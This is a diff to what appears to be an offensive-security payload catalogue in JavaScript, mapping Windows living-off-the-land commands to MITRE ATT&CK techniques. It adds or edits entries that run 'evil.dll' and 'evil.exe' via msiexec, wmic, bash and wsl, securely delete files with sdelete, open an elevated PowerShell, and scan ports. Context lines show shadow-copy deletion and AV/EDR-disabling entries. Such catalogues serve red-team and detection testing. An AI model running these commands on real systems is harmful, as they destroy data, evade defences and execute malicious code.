@@ -190,6 +190,16 @@ const PAYLOADS = {
             'desc': 'The command deletes shadow copies.',
         },
     },
+    'Delete Files': {
+        'Sdelete': {
+            'cmd': 'sdelete -p 3 .\\example.txt',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1485', 'url': 'https://attack.mitre.org/techniques/T1485/'},
+            'lolbas': null,
+            'desc': 'The command securely deletes a file. The deleted file cannot be recovered.',
+        },
+    },
     'Disable AV/EDR': {
         'bcdedit': {
             'cmd': 'bcdedit /set safeboot network',
@@ -1037,6 +1047,22 @@ const PAYLOADS = {
         },
     },
     'Execute DLL': {
+        'Msiexec (/y)': {
+            'cmd': 'msiexec /y C:\\evil.dll',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1218.007', 'url': 'https://attack.mitre.org/techniques/T1218/007/'},
+            'lolbas': null,
+            'desc': null,
+        },
+        'Msiexec (/z)': {
+            'cmd': 'msiexec /z C:\\evil.dll',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1218.007', 'url': 'https://attack.mitre.org/techniques/T1218/007/'},
+            'lolbas': null,
+            'desc': null,
+        },
         'Register-CimProvider': {
             'cmd': 'C:\\Windows\\SysWOW64\\Register-CimProvider.exe -Path .\\evil.dll',
             'cli': null,
@@ -1072,7 +1098,7 @@ const PAYLOADS = {
     },
     'Execute EXE': {
         'Bash': {
-            'cmd': 'bash -c evil.exe',
+            'cmd': 'bash -c "cmd.exe /c evil.exe"',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
@@ -1176,7 +1202,7 @@ const PAYLOADS = {
             'desc': 'The command adds the task that executes arbitrary .exe file every minute.',
         },
         'Wmic': {
-            'cmd': 'wmic process call create calc.exe',
+            'cmd': 'wmic process call create C:\\evil.exe',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
@@ -1184,7 +1210,7 @@ const PAYLOADS = {
             'desc': null,
         },
         'Wsl': {
-            'cmd': 'wsl /mnt/c/Users/Public/Desktop/evil.exe',
+            'cmd': 'wsl /mnt/c/Users/Public/evil.exe',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
@@ -1525,6 +1551,16 @@ const PAYLOADS = {
             'desc': null,
         },
     },
+    'Privilege Escalation': {
+        'PowerShell (Start-Process)': {
+            'cmd': 'start powershell -Verb runAs',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': null,
+            'lolbas': null,
+            'desc': 'The command starts a PowerShell process as Administrator. The UAC prompt will open.',
+        },
+    },
     'Reveal ADS': {
         'Dir': {
             'cmd': 'cmd /c dir /r .\\file.txt',
@@ -1533,6 +1569,16 @@ const PAYLOADS = {
             'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
             'lolbas': null,
             'desc': 'The command reveals an information of Alternate Data Stream in arbitrary file (\'file.txt\').',
+        },
+    },
+    'Scan Ports': {
+        'PowerShell': {
+            'cmd': '@(21,22,23,25,53,80,88,135,139,389,443,445,464,593,636,3000,3268,3269,3306,3389,5432,5900,5985,6379,8000,8080) | % {echo ((New-Object Net.Sockets.TcpClient).Connect("localhost",$_)) "Port $_ open"} 2>$null',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1046', 'url': 'https://attack.mitre.org/techniques/T1046/'},
+            'lolbas': null,
+            'desc': 'The command scans opening ports.',
         },
     },
     'Sniff Network': {
